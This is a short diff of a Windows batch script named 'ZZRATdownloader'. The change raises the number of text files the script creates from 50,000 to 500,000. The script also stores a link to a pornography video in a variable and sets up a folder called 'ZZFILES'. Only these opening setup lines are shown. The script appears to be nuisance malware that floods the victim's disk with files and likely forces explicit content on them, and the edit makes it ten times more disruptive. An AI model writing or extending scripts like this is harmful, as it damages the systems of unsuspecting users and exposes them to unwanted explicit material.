@@ -1,7 +1,7 @@
 ::ZZRATdownloader
 @echo off
 REM Set the number of text files to create
-set count=50000
+set count=500000
 Set phlink=https://www.pornhub.com/view_video.php?viewkey=67b2171a9a6cd
 
 REM Create a folder named "ZZFILES"
